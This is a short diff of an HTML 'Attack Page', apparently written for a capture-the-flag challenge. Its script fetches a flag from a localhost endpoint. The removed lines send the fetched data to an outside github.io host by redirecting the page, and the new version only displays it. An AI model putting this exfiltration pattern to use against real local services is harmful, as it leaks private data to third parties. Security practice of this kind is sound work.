@@ -4,12 +4,12 @@
   <title>Attack Page</title>
 </head>
 <body>
-  test
+  <div id="flag-container"></div>
   <script>
     fetch('http://localhost/flag?flag=hspace{')
       .then(response => response.text())
       .then(data => {
-        document.location = 'https://binsh0501.github.io/?data=' + encodeURIComponent(data);
+        document.getElementById('flag-container').textContent = data;
       });
   </script>
 </body>
